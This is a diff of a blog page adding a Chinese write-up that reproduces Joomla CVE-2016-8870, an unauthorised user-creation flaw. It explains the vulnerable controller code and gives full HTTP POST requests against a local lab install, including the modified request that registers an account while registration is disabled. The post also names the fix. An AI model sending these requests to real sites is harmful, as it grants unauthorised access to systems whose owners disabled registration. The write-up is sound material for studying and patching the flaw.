@@ -78,7 +78,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/12/27/test/" title="test" itemprop="url">test</a>
+      <a href="/2017/12/27/test/" title="Joomla未授权创建用户漏洞(CVE-2016-8870)复现" itemprop="url">Joomla未授权创建用户漏洞(CVE-2016-8870)复现</a>
   </h1>
   <p class="article-author">By
        
@@ -91,7 +91,140 @@
 </header>
     <div class="article-content">
         
-        
+        <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Joomla是一个自由开源的内容管理系统，在其3.4.4到3.6.3的版本中存在两个漏洞：CVE-2016-8869，CVE-2016-8870。</p>
+<p>在这里仅分析CVE-2016-8870，利用该漏洞，攻击者可以在网站关闭注册的情况下注册用户（默认状态下用户需要用邮件激活，但需要开启注册功能才能激活）。Joomla官方已对此漏洞发布升级公告。</p>
+<h1 id="相关技术和工具简介"><a href="#相关技术和工具简介" class="headerlink" title="相关技术和工具简介"></a>相关技术和工具简介</h1><p>   CVE:2016-8870<br>   虚拟机：VMware Fusion<br>    主机操作系统：MAC OSX<br>    虚拟机操作系统：windows7<br>    php建站环境：<br>    phpstudy（PHP+MySQL+phpMyAdmin+ZendOptimizer）<br>    抓包工具：burpsuite<br>    测试浏览器：Mozilla Firefox</p>
+<h1 id="相关工具源码下载以及Web环境搭建过程"><a href="#相关工具源码下载以及Web环境搭建过程" class="headerlink" title="相关工具源码下载以及Web环境搭建过程"></a>相关工具源码下载以及Web环境搭建过程</h1><p>通过wget命令下载github上joomla对应漏洞版本。</p>
+<pre><code>wget https://github.com/joomla/joomla-cms/releases/download/3.6.3/Joomla_3.6.3-Stable-Full_Package.tar.gz
+</code></pre><p>然后解压到对应文件夹（WWW文件夹下）</p>
+<p>在phpmyadmin里创建数据库表单。</p>
+<p><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:1.png" alt="1.jpg"></p>
+<p>按照提示搭建网站。</p>
+<p><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:2.png" alt="2.jpg"><br>渗透环境搭建完毕。</p>
+<h1 id="相关代码分析"><a href="#相关代码分析" class="headerlink" title="相关代码分析"></a>相关代码分析</h1><h2 id="漏洞代码分析以及解决方法"><a href="#漏洞代码分析以及解决方法" class="headerlink" title="漏洞代码分析以及解决方法"></a>漏洞代码分析以及解决方法</h2><p>存在漏洞的版本中我们可以看到一个有趣的现象，即存在两个用于用户注册的方法：<br>1.位于components/com_users/controllers/registration.php中的UsersControllerRegistration::register()<br>有代码检查是否允许注册。</p>
+<pre><code>// If registration is disabled - Redirect to login page. 
+if (JComponentHelper::getParams(&apos;com_users&apos;)-&gt;get(&apos;allowUserRegistration&apos;) == 0) 
+{ 
+$this-&gt;setRedirect(JRoute::_(&apos;index.php?
+option=com_users&amp;view=login&apos;, false));
+ return false; 
+ }
+</code></pre><p>通过测试可知正常的注册默认使用的是UsersControllerRegistration::register()</p>
+<p>2.在位于components/com_users/controllers/user.php中的UsersControllerUser::register()<br>没有代码检查是否允许注册。</p>
+<p>可以通过第二种注册方式绕过注册检验。</p>
+<p>修复方案：升级到joomla最新版本</p>
+<h2 id="实际情况"><a href="#实际情况" class="headerlink" title="实际情况"></a>实际情况</h2><p>实际攻击时，joomla默认是关闭注册的。<br>因为有session验证，需要更改发包的cookie和token。</p>
+<p>可通过访问index.php抓包获取cookie。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:3.png" alt="3.jpg"><br>通过看index.php源码获取token。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:4.png" alt="4.jpg"><br>构造请求包同之前的抓包内容相同，只需要更改cookie和token。</p>
+<h1 id="渗透测试过程"><a href="#渗透测试过程" class="headerlink" title="渗透测试过程"></a>渗透测试过程</h1><h2 id="通过burpsuite抓包发送注册请求"><a href="#通过burpsuite抓包发送注册请求" class="headerlink" title="通过burpsuite抓包发送注册请求"></a>通过burpsuite抓包发送注册请求</h2><p>主页默认注册功能关闭。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:5.png" alt="5.jpg"><br>进入后台，打开注册功能。<br>回到主页。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:6.png" alt="6.jpg"></p>
+<p>进入创建账号<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:7.png" alt="7.jpg"><br>打开burp抓包。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:8.png" alt="8.jpg"><br>请求包如下：</p>
+<pre><code>POST /Joomla_3.6.3-Stable-Full_Package/index.php/component/users/?task=registration.register HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/Joomla_3.6.3-Stable-Full_Package/index.php/component/users/?view=registration
+Content-Type: multipart/form-data; boundary=---------------------------191272338010927
+Content-Length: 1067
+Cookie: 992f2039e48467709d6be10405b3f315=u1fbtsgoroljfrch92fp06gkb6; 9d4bb4a09f511681369671a08beff228=llas1g23eocp6ollka96n1ab47; db40ec8731a11c0a68bac5e22ce3f893=nqfmmiplrb6f9s8e5gbgj9e4v2; 83db29fcaa4faf18baf150a30cbe21e2=4rdpvfmheaqbe9nnseccqju6c3
+Connection: keep-alive
+    Upgrade-Insecure-Requests: 1
+
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[name]&quot;
+
+hacker1
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[username]&quot;
+
+hacker1
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[password1]&quot;
+
+123456
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[password2]&quot;
+
+123456
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[email1]&quot;
+
+2@qq.com
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;jform[email2]&quot;
+
+2@qq.com
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;option&quot;
+
+com_users
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;task&quot;
+
+registration.register
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;6daaa4fabc7a555dc064a9b67d2701f4&quot;
+
+1
+-----------------------------191272338010927--
+</code></pre><p>在后台关闭注册。可以看到首页并没有注册选项。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:9.png" alt="9.jpg"><br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:10.png" alt="10.jpg"><br>注册功能关闭了。<br>此时发请求包并不能注册。<br>在burp里将将请求包进行如下修改即可使用存在漏洞的函数进行注册：</p>
+<pre><code>registration.register -&gt; user.register
+jform[*] -&gt; user[*]
+</code></pre><p>更改后的请求包：</p>
+<pre><code>POST  /Joomla_3.6.3-Stable-Full_Package/index.php/component/users/?task= user.register HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/Joomla_3.6.3-Stable-Full_Package/index.php/component/users/?view=registration
+Content-Type: multipart/form-data; boundary=---------------------------191272338010927
+Content-Length: 1067
+Cookie: 992f2039e48467709d6be10405b3f315=u1fbtsgoroljfrch92fp06gkb6; 9d4bb4a09f511681369671a08beff228=llas1g23eocp6ollka96n1ab47; db40ec8731a11c0a68bac5e22ce3f893=nqfmmiplrb6f9s8e5gbgj9e4v2; 83db29fcaa4faf18baf150a30cbe21e2=4rdpvfmheaqbe9nnseccqju6c3
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;user[name]&quot;
+
+hacker1
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot; user [username]&quot;
+
+hacker1
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot; user [password1]&quot;
+
+123456
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot; user [password2]&quot;
+
+123456
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot; user [email1]&quot;
+
+2@qq.com
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot; user [email2]&quot;
+
+2@qq.com
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;option&quot;
+
+com_users
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;task&quot;
+
+user.register
+-----------------------------191272338010927
+Content-Disposition: form-data; name=&quot;6daaa4fabc7a555dc064a9b67d2701f4&quot;
+
+1
+-----------------------------191272338010927--
+</code></pre><p>发包，然后后台可以看到在关闭注册的情况下，注册成功。<br><img src="http://oyyavfixl.bkt.clouddn.com/image:8870:11.png" alt="11.jpg"></p>
+<p>漏洞复现完成。</p>
+<h2 id="补丁修复"><a href="#补丁修复" class="headerlink" title="补丁修复"></a>补丁修复</h2><p>官方删除了UsersControllerUser::register()的注册方法。</p>
+
         
         
         <p class="article-more-link">
@@ -101,6 +234,11 @@
     <footer class="article-footer clearfix">
 <div class="article-catetags">
 
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/WEB/">WEB</a>
+  </div>
 
 </div>
 
@@ -554,15 +692,15 @@ gnuplot直接用“plot 函数/文件”可以导出图片（更复杂的操作�
 		<ul class="clearfix">
 		
 			
+				<li><a href="/tags/WEB/" title="WEB">WEB<sup>2</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/CRYPTO/" title="CRYPTO">CRYPTO<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/WEB/" title="WEB">WEB<sup>1</sup></a></li>
 			
 		
 		</ul>
